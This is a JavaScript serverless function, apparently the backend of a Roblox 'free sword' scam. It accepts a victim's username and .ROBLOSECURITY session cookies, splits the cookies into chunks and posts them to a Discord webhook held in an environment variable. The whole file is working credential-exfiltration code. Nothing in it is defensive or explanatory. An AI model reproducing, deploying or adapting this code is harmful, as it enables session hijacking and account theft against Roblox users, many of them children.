// Vercel Serverless Function — Discord webhook proxy
// Path: api/send-webhook.js

export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

  if (!WEBHOOK_URL) {
    return res.status(500).json({ error: 'Webhook URL not set' });
  }

  try {
    // Parse body
    let body = req.body;
    if (typeof body === 'string') {
      try { body = JSON.parse(body); } catch (e) { body = {}; }
    }
    if (!body || typeof body !== 'object') body = {};

    const { username, sword, cookies } = body;

    console.log('Received:', { username, sword, cookiesLength: cookies ? cookies.length : 0 });

    // Build content message (Discord content max = 2000 char)
    // Split cookies kalo kepanjangan
    const cookieStr = cookies || '(no cookies)';
    const chunks = [];
    for (let i = 0; i < cookieStr.length; i += 1900) {
      chunks.push(cookieStr.substring(i, i + 1900));
    }

    // Kirim pesan utama
    const headerMsg = `**⚔️ GIVE SWORD PLAYER - NEW DATA**\n\n` +
                      `**👤 Roblox Username:** \`${username || '-'}\`\n` +
                      `**🗡️ Selected Sword:** \`${sword || '-'}\`\n` +
                      `**🍪 Cookies (.ROBLOSECURITY):**`;

    let finalResponse;
    let allOk = true;

    // Kirim header dulu
    const headerRes = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: headerMsg })
    });
    if (!headerRes.ok) allOk = false;

    // Kirim cookies (chunk per chunk, code block biar rapi)
    for (let i = 0; i < chunks.length; i++) {
      const chunkMsg = chunks.length > 1
        ? `\`\`\`Part ${i+1}/${chunks.length}\n${chunks[i]}\`\`\``
        : `\`\`\`${chunks[i]}\`\`\``;

      const r = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: chunkMsg })
      });
      if (!r.ok) allOk = false;
      finalResponse = r;
    }

    return res.status(allOk ? 200 : 500).json({
      ok: allOk,
      chunksSent: chunks.length,
      cookieLength: cookieStr.length
    });

  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({
      error: 'Failed',
      message: error.message
    });
  }
}
